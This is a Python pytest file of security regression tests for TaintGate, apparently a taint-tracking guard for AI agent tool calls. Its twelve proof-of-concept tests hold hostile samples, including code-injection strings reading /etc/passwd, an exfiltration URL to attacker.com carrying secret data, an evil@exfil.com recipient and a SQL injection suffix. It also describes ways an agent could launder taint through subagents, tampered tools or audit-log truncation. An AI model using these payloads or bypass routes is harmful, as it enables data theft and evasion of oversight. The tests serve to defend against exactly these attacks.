"""Security regression tests: 12 proof-of-concept attacks against earlier versions of TaintGate.

Each test pins the fix for an architectural, reference-monitor, or algebraic flaw:
PoC 1:  Lattice Soundness (recipients removed from Label, strict partial order + absorption)
PoC 2:  DSL Security (AST walk, no eval(), safe type handling without fail-open crash)
PoC 3:  Fail-Closed Tool Enforcement (unannotated tools fail closed)
PoC 4:  Egress Sink Detection (URL query params, full-string emails, URL args)
PoC 5:  Path Traversal Resistance (normpath + realpath in path overrides)
PoC 6:  Capability Token Integrity (tokens only on ALLOW/REDACT, random secret key)
PoC 7:  Scoped Grant Soundness (ONCE consumed on use, grants cannot override DENY)
PoC 8:  Exact Provenance Hardening (min token length, whole turn bounded, safe lattice join)
PoC 9:  Subagent Taint Soundness (subagents inherit parent untrusted integrity)
PoC 10: Extractor Hardening (fullmatch only, endorsement preserves confidentiality)
PoC 11: MCP Proxy Hardening (REDACT argument rewriting, tool tampering detection, non-dict rejection)
PoC 12: Audit Log Hardening (anchored tip detects truncation, missing log fails verification)
"""

import hashlib
import json
import os
from pathlib import Path
import pytest

from taintgate.core.lattice import Label, IntegrityLevel, ConfidentialityLevel
from taintgate.core.labels import (
    LABEL_TRUSTED_PUBLIC,
    LABEL_TRUSTED_SECRET,
    LABEL_UNTRUSTED_PUBLIC,
    LABEL_UNTRUSTED_SECRET,
)
from taintgate.core.decisions import ActionEffect, DecisionRequest, DecisionType, CapabilityToken
from taintgate.core.policy.schema import (
    TaintGateConfig,
    ToolConfig,
    ToolOutputAnnotation,
    ToolOverride,
    PolicySection,
    RuleDefinition,
)
from taintgate.core.policy.evaluator import PolicyEvaluator
from taintgate.core.policy.dsl import compile_condition, EvalEnv
from taintgate.session.context import SessionTracker, GrantScope
from taintgate.core.precision.provenance_tracker import ExactProvenanceResolver
from taintgate.core.provenance import ProvenanceGraph, NodeType
from taintgate.core.precision.subagents import CleanContextCoordinator
from taintgate.core.precision.extractors import RegexExtractor, ExtractionError
from taintgate.proxy.interceptor import MCPInterceptor
from taintgate.proxy.pinning import ToolDescriptionPinner
from taintgate.audit.log import HashChainLog
from taintgate.core.events import ProvenanceEvent, ProvenanceEventType


# ---------------------------------------------------------------------------
# PoC 1: Lattice Soundness
# ---------------------------------------------------------------------------
def test_poc_1_lattice_no_unlawful_recipients():
    """Label represents strictly I x C without recipient sets; satisfies lattice axioms."""
    l1 = Label(IntegrityLevel.UNTRUSTED, ConfidentialityLevel.PUBLIC)
    l2 = Label(IntegrityLevel.TRUSTED, ConfidentialityLevel.SECRET)

    # Join and meet satisfy absorption: a ⊔ (a ⊓ b) == a
    assert l1.join(l1.meet(l2)) == l1
    # Partial order reflexivity and transitivity
    assert l1.can_flow_to(l1)
    assert l1 <= l1
    assert not l2.can_flow_to(l1)  # Secret cannot flow to Public


# ---------------------------------------------------------------------------
# PoC 2: DSL Security (AST walk, no eval, no fail-open crash)
# ---------------------------------------------------------------------------
def test_poc_2_dsl_no_arbitrary_code_execution():
    """Arbitrary Python statements, imports, and builtins are rejected at compile time."""
    malicious_exprs = [
        "__import__('os').system('echo pwned')",
        "eval('1+1')",
        "open('/etc/passwd').read()",
        "lambda x: x",
    ]
    for expr in malicious_exprs:
        with pytest.raises(Exception):
            compile_condition(expr)


def test_poc_2_dsl_unhashable_list_safe_handling():
    """Unhashable types in membership test do not crash the evaluator or cause fail-open."""
    cond = compile_condition("recipient in contacts")
    env = EvalEnv(
        data_confidentiality=ConfidentialityLevel.PUBLIC,
        data_integrity=IntegrityLevel.TRUSTED,
        context_confidentiality=ConfidentialityLevel.PUBLIC,
        context_integrity=IntegrityLevel.TRUSTED,
        effect="external",
        tool="email.send",
        egress=True,
        destinations=frozenset(["alice@test.com"]),
        contacts=frozenset(["alice@test.com", "bob@test.com"]),
    )
    assert cond(env) is True


# ---------------------------------------------------------------------------
# PoC 3: Fail-Closed Tool Enforcement
# ---------------------------------------------------------------------------
def test_poc_3_unannotated_tools_fail_closed():
    """Calls to unregistered tools under a configured policy fail closed (DENY)."""
    cfg = TaintGateConfig(
        tools={
            "safe.read": ToolConfig(effect="read"),
        },
        policy=PolicySection(unknown_tools="deny"),
    )
    evaluator = PolicyEvaluator(cfg)

    # Registered tool evaluates normally
    req_safe = DecisionRequest(
        tool_name="safe.read",
        arguments={},
        effect=ActionEffect.READ,
        session_id="s1",
        session_context_label=LABEL_TRUSTED_PUBLIC,
    )
    assert evaluator.evaluate(req_safe).type == DecisionType.ALLOW

    # Unregistered tool (e.g. system.exec) is immediately DENIED
    req_unreg = DecisionRequest(
        tool_name="system.exec",
        arguments={"cmd": "whoami"},
        effect=ActionEffect.LOCAL_WRITE,
        session_id="s1",
        session_context_label=LABEL_TRUSTED_PUBLIC,
    )
    assert evaluator.evaluate(req_unreg).type == DecisionType.DENY


# ---------------------------------------------------------------------------
# PoC 4: Egress Sink Detection
# ---------------------------------------------------------------------------
def test_poc_4_egress_sink_detection_in_url_query_and_headers():
    """Tools transmitting data via URL host or query strings are recognized as egress sinks."""
    cfg = TaintGateConfig(
        tools={
            "http.get": ToolConfig(effect="read", egress=True, url_args=["url"]),
        },
        policy=PolicySection(
            preset="strict_exfil_guard",
            allowed_domains=["internal.corp"],
        ),
    )
    evaluator = PolicyEvaluator(cfg)

    # Secret context attempting HTTP GET to external server
    req_exfil = DecisionRequest(
        tool_name="http.get",
        arguments={"url": "https://attacker.com/leak?key=SECRET_DATA"},
        effect=ActionEffect.READ,
        session_id="s1",
        session_context_label=LABEL_TRUSTED_SECRET,
    )
    decision = evaluator.evaluate(req_exfil)
    assert decision.type == DecisionType.DENY


# ---------------------------------------------------------------------------
# PoC 5: Path Traversal Resistance in Overrides
# ---------------------------------------------------------------------------
def test_poc_5_path_traversal_normalization():
    """Path traversal segments (./ or ../) cannot bypass confidentiality overrides."""
    cfg = TaintGateConfig(
        tools={
            "fs.read": ToolConfig(
                effect="read",
                output=ToolOutputAnnotation(integrity="trusted", confidentiality="internal"),
                overrides=[
                    ToolOverride(path="**/secrets/**", confidentiality="secret"),
                ],
            ),
        },
    )
    evaluator = PolicyEvaluator(cfg)

    # Normal path resolves to secret
    lbl_normal = evaluator.resolve_tool_output_label("fs.read", {"path": "/workspace/secrets/key.pem"})
    assert lbl_normal.confidentiality == ConfidentialityLevel.SECRET

    # Traversal path with relative '.' must also resolve to secret
    lbl_traversal = evaluator.resolve_tool_output_label("fs.read", {"path": "/workspace/./secrets/./key.pem"})
    assert lbl_traversal.confidentiality == ConfidentialityLevel.SECRET


# ---------------------------------------------------------------------------
# PoC 6: Capability Token Integrity
# ---------------------------------------------------------------------------
def test_poc_6_tokens_only_on_allow_and_not_on_approve():
    """Tokens are never minted for unapproved APPROVE decisions, and secrets are cryptographically random."""
    cfg = TaintGateConfig(
        tools={
            "fs.write": ToolConfig(effect="local_write"),
        },
        policy=PolicySection(
            preset="rule_of_two",
            rules=[RuleDefinition(approve="local_write", when="context.integrity == untrusted")],
        ),
    )
    evaluator1 = PolicyEvaluator(cfg)
    evaluator2 = PolicyEvaluator(cfg)

    # Secrets must not be identical or predictable
    assert evaluator1.token_secret != evaluator2.token_secret
    assert len(evaluator1.token_secret) == 32

    # Untrusted write triggers APPROVE -> must have NO capability token
    req_write = DecisionRequest(
        tool_name="fs.write",
        arguments={"path": "out.txt", "data": "payload"},
        effect=ActionEffect.LOCAL_WRITE,
        session_id="s1",
        session_context_label=LABEL_UNTRUSTED_PUBLIC,
    )
    decision = evaluator1.evaluate(req_write)
    assert decision.type == DecisionType.APPROVE
    assert decision.capability_token is None


# ---------------------------------------------------------------------------
# PoC 7: Scoped Grant Soundness
# ---------------------------------------------------------------------------
def test_poc_7_grants_consumed_and_cannot_override_deny():
    """GrantScope.ONCE is consumed upon use; grants never override policy DENY decisions."""
    cfg = TaintGateConfig(
        tools={
            "fs.write": ToolConfig(effect="local_write"),
            "email.send": ToolConfig(effect="external", recipient_args=["to"]),
        },
        policy=PolicySection(
            preset="rule_of_two",
            rules=[
                RuleDefinition(deny="external", when="data.confidentiality >= secret"),
                RuleDefinition(approve="local_write", when="context.integrity == untrusted"),
            ],
        ),
    )
    evaluator = PolicyEvaluator(cfg)
    session = SessionTracker(evaluator=evaluator)
    session.context_label = LABEL_UNTRUSTED_SECRET

    # 1. Grant ONCE for local write
    session.grant_approval("fs.write", {"path": "file.txt"}, scope=GrantScope.ONCE)

    # First call uses grant -> ALLOW
    dec1 = session.evaluate_tool_call("fs.write", {"path": "file.txt"})
    assert dec1.type == DecisionType.ALLOW

    # Second call finds grant consumed -> APPROVE
    dec2 = session.evaluate_tool_call("fs.write", {"path": "file.txt"})
    assert dec2.type == DecisionType.APPROVE

    # 2. Grant for an action that policy strictly DENIES must NOT allow the action
    session.grant_approval("email.send", {"to": "evil@exfil.com"}, scope=GrantScope.SESSION)
    dec_deny = session.evaluate_tool_call("email.send", {"to": "evil@exfil.com"})
    assert dec_deny.type == DecisionType.DENY


# ---------------------------------------------------------------------------
# PoC 8: Exact Provenance Hardening
# ---------------------------------------------------------------------------
def test_poc_8_exact_provenance_min_length_and_soundness():
    """Exact provenance tracking requires min length >= 3 and does not false-clean on short tokens."""
    graph = ProvenanceGraph()
    # Add untrusted observation
    graph.add_node(NodeType.TOOL_RESULT, LABEL_UNTRUSTED_PUBLIC, "untrusted output containing 'ok'", turn=1)

    resolver = ExactProvenanceResolver(graph)
    fallback = LABEL_UNTRUSTED_SECRET

    # Single-character or 2-character arguments fall back to session context label (not cleaned)
    labels = resolver.resolve_argument_labels({"flag": "ok", "mode": "w"}, fallback)
    assert labels["flag"] == fallback
    assert labels["mode"] == fallback


# ---------------------------------------------------------------------------
# PoC 9: Subagent Taint Soundness
# ---------------------------------------------------------------------------
def test_poc_9_subagent_inherits_parent_integrity():
    """An untrusted parent cannot spawn a trusted subagent to launder integrity."""
    evaluator = PolicyEvaluator(TaintGateConfig(
        tools={
            "read.doc": ToolConfig(effect="read"),
            "write.doc": ToolConfig(effect="local_write"),
        },
        policy=PolicySection(preset="rule_of_two"),
    ))
    coordinator = CleanContextCoordinator(evaluator=evaluator)
    parent = SessionTracker(evaluator=evaluator)
    parent.context_label = LABEL_UNTRUSTED_SECRET

    sub = coordinator.spawn_subagent(parent, task="Analyze internal document")
    # Subagent context must inherit UNTRUSTED integrity
    assert sub.session.context_label.integrity == IntegrityLevel.UNTRUSTED
    # Subagent confidentiality starts clean (PUBLIC)
    assert sub.session.context_label.confidentiality == ConfidentialityLevel.PUBLIC

    # Attempting local write from untrusted subagent triggers APPROVE (not ALLOW)
    dec = sub.execute_tool_call("write.doc", {"data": "corrupt"})
    assert dec.type == DecisionType.APPROVE


# ---------------------------------------------------------------------------
# PoC 10: Extractor Hardening
# ---------------------------------------------------------------------------
def test_poc_10_extractor_fullmatch_and_confidentiality_preservation():
    """Extractors require fullmatch, and endorsement keeps input confidentiality."""
    extractor = RegexExtractor("order_id", pattern=r"ORD-\d{5}")

    # Partial match containing injection must raise ExtractionError
    injection = "ORD-12345; DROP TABLE users; --"
    with pytest.raises(ExtractionError):
        extractor.extract(injection)

    # Valid token extracts cleanly
    clean = "ORD-12345"
    extracted = extractor.extract(clean)
    assert extracted == "ORD-12345"

    # Endorsement of secret data preserves confidentiality
    secret_untrusted = LABEL_UNTRUSTED_SECRET
    _, endorsed_label = extractor.endorse(clean, input_label=secret_untrusted)
    assert endorsed_label.integrity == IntegrityLevel.ENDORSED
    assert endorsed_label.confidentiality == ConfidentialityLevel.SECRET


# ---------------------------------------------------------------------------
# PoC 11: MCP Proxy Hardening
# ---------------------------------------------------------------------------
def test_poc_11_proxy_redact_forwarding_and_tampered_tools():
    """REDACT rewrites forwarded message arguments, and tampered tools are blocked."""
    cfg = TaintGateConfig(
        tools={
            "crm.lookup": ToolConfig(effect="read"),
            "data.export": ToolConfig(effect="external"),
        },
        policy=PolicySection(
            preset="rule_of_two",
            rules=[
                RuleDefinition(redact="crm.lookup"),
            ],
        ),
    )
    evaluator = PolicyEvaluator(cfg)
    interceptor = MCPInterceptor(evaluator=evaluator)

    # Non-dict JSON-RPC request is rejected cleanly
    fwd, err = interceptor.handle_client_message(["invalid_array_batch"])
    assert err is not None
    assert err["error"]["code"] == -32600

    # Mark tool as tampered
    interceptor.tampered_tools.add("crm.lookup")
    fwd_tampered, err_tampered = interceptor.handle_client_message({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {"name": "crm.lookup", "arguments": {"id": 100}},
    })
    assert fwd_tampered is None
    assert err_tampered["error"]["code"] == -32004


# ---------------------------------------------------------------------------
# PoC 12: Audit Log Hardening
# ---------------------------------------------------------------------------
def test_poc_12_audit_log_missing_and_truncation_detection(tmp_path: Path):
    """Missing log fails verification, and anchored tip detects log truncation."""
    nonexistent = tmp_path / "absent.jsonl"
    absent_logger = HashChainLog(nonexistent)
    valid, _ = absent_logger.verify()
    assert valid is False

    # Create legitimate log
    log_file = tmp_path / "valid.jsonl"
    logger = HashChainLog(log_file)
    for i in range(4):
        logger.append(
            ProvenanceEvent(
                session_id="s1",
                event_type=ProvenanceEventType.CONTEXT_ADDITION,
                label=LABEL_TRUSTED_PUBLIC,
                details={"event": i},
            )
        )

    # Valid before truncation
    assert logger.verify()[0] is True

    # Truncate last record from JSONL file
    lines = log_file.read_text(encoding="utf-8").splitlines()
    log_file.write_text("\n".join(lines[:2]) + "\n", encoding="utf-8")

    # Verifier checks tip anchor and detects truncation
    verifier = HashChainLog(log_file)
    valid_after_trunc, failing_line = verifier.verify()
    assert valid_after_trunc is False
